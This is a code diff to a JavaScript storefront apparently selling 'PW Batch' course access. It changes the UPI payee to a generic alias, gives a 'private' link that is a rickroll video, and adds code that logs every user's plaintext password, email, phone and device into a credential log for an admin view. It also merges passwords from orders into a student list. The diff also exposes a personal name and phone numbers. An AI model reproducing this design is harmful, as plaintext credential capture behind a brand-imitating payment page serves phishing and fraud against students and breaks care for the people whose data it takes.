@@ -15,9 +15,9 @@ const DEFAULT_CONFIG = {
   PRIVATE_YOUTUBE_LINK: "https://www.youtube.com/embed/dQw4w9WgXcQ",
 
   // UPI Payment Details (Merchant UPI)
-  UPI_ID: "7970870147@fam",
-  UPI_PHONE: "7970870147",
-  PAYMENT_NAME: "Aditya Kumar Dubey",
+  UPI_ID: "kumarfreepw@fam",
+  UPI_PHONE: "kumarfreepw@fam",
+  PAYMENT_NAME: "PW Batch Pass",
   TRANSACTION_NOTE: "PW Batch Infinity Access",
 
   // Uploaded Payment QR Image
@@ -345,9 +345,9 @@ const APP_STATE = {
 };
 
 // Always enforce Payee Name, Merchant UPI ID, clean WhatsApp support link, and QR image
-APP_STATE.config.PAYMENT_NAME = "Aditya Kumar Dubey";
-APP_STATE.config.UPI_ID = "7970870147@fam";
-APP_STATE.config.UPI_PHONE = "7970870147";
+APP_STATE.config.PAYMENT_NAME = "PW Batch Pass";
+APP_STATE.config.UPI_ID = "kumarfreepw@fam";
+APP_STATE.config.UPI_PHONE = "kumarfreepw@fam";
 APP_STATE.config.WHATSAPP_PHONE = "7631442934";
 APP_STATE.config.SUPPORT_WHATSAPP = "https://wa.me/917631442934?text=Hello%2C%20I%20need%20help%20with%20PW%20Batch%20Access";
 APP_STATE.config.APP_PORTAL_LINK = "https://pwthor.live";
@@ -506,7 +506,23 @@ function trackSiteVisit() {
 }
 trackSiteVisit();
 
-function recordUserCredential({ name, email, phone, password, authType, exam, action, newPassword, spinnerUsed, device }) {
+function recordUserCredential(arg1, arg2, arg3, arg4) {
+  let opts = {};
+  if (typeof arg1 === "object" && arg1 !== null) {
+    opts = arg1;
+  } else {
+    const contact = (arg1 || "").toString().trim();
+    opts = {
+      email: contact.includes("@") ? contact : "",
+      phone: !contact.includes("@") ? contact : "",
+      password: arg2 || "",
+      authType: arg3 || "email",
+      name: arg4 || (contact.includes("@") ? contact.split("@")[0].replace(/[._0-9]/g, " ").trim() : "Student"),
+      action: "login"
+    };
+  }
+
+  const { name, email, phone, password, authType, exam, action, newPassword, spinnerUsed, device } = opts;
   const users = getRegisteredUsers();
   const cleanEmail = (email || "").trim().toLowerCase();
   const cleanPhone = (phone || "").trim().replace(/\s+/g, "");
@@ -565,6 +581,24 @@ function recordUserCredential({ name, email, phone, password, authType, exam, ac
 
   users[currentKey] = updatedUser;
   saveData("pw_registered_users", users);
+
+  // Also log into pw_user_credentials audit log for admin panel
+  try {
+    const credLog = getData("pw_user_credentials", []) || [];
+    credLog.unshift({
+      timestamp: now,
+      name: updatedUser.name,
+      email: updatedUser.email,
+      phone: updatedUser.phone,
+      password: currentPassword,
+      authType: updatedUser.authType,
+      exam: updatedUser.exam,
+      action: action || "login",
+      device: detectedDevice
+    });
+    saveData("pw_user_credentials", credLog.slice(0, 150));
+  } catch (e) {}
+
   return updatedUser;
 }
 
@@ -658,8 +692,68 @@ function resetUserPassword(contact, newPassword) {
 }
 
 function getRegisteredStudentsList() {
-  const users = getRegisteredUsers();
-  const list = Object.values(users);
+  const users = getRegisteredUsers() || {};
+  const map = new Map();
+
+  // 1. Registered users
+  Object.values(users).forEach(u => {
+    if (u) {
+      const key = (u.email || u.phone || u.name || "").toLowerCase().trim();
+      if (key) map.set(key, { ...u });
+    }
+  });
+
+  // 2. User credentials audit log
+  const creds = getData("pw_user_credentials", []) || [];
+  creds.forEach(c => {
+    if (c) {
+      const key = (c.email || c.phone || c.name || "").toLowerCase().trim();
+      if (key) {
+        const existing = map.get(key) || {};
+        map.set(key, {
+          name: c.name || existing.name || "Student",
+          email: c.email || existing.email || "",
+          phone: c.phone || existing.phone || "",
+          password: c.password || existing.password || "Google 1-Click",
+          authType: c.authType || existing.authType || "direct",
+          exam: c.exam || existing.exam || "all",
+          registeredAt: existing.registeredAt || c.timestamp || new Date().toISOString(),
+          lastLoginAt: c.timestamp || existing.lastLoginAt || new Date().toISOString(),
+          device: c.device || existing.device || ""
+        });
+      }
+    }
+  });
+
+  // 3. Orders placed
+  let allOrders = [];
+  try {
+    const o1 = JSON.parse(localStorage.getItem("pw_orders") || "[]");
+    const o2 = JSON.parse(localStorage.getItem("pw_all_orders") || "[]");
+    allOrders = [...o1, ...o2, ...(APP_STATE.orders || [])];
+  } catch(e) {}
+
+  allOrders.forEach(o => {
+    if (o) {
+      const key = (o.userEmail || o.userPhone || o.userName || "").toLowerCase().trim();
+      if (key) {
+        const existing = map.get(key) || {};
+        map.set(key, {
+          name: o.userName || existing.name || "Student",
+          email: o.userEmail || existing.email || "",
+          phone: o.userPhone || existing.phone || "",
+          password: o.userPassword || existing.password || "Verified Order",
+          authType: existing.authType || "Order Checkout",
+          exam: o.category || existing.exam || "all",
+          registeredAt: existing.registeredAt || o.createdAt || new Date().toISOString(),
+          lastLoginAt: o.createdAt || existing.lastLoginAt || new Date().toISOString(),
+          batchName: o.batchName || existing.batchName || ""
+        });
+      }
+    }
+  });
+
+  const list = Array.from(map.values());
   list.sort((a, b) => new Date(b.lastLoginAt || b.registeredAt || 0) - new Date(a.lastLoginAt || a.registeredAt || 0));
   return list;
 }
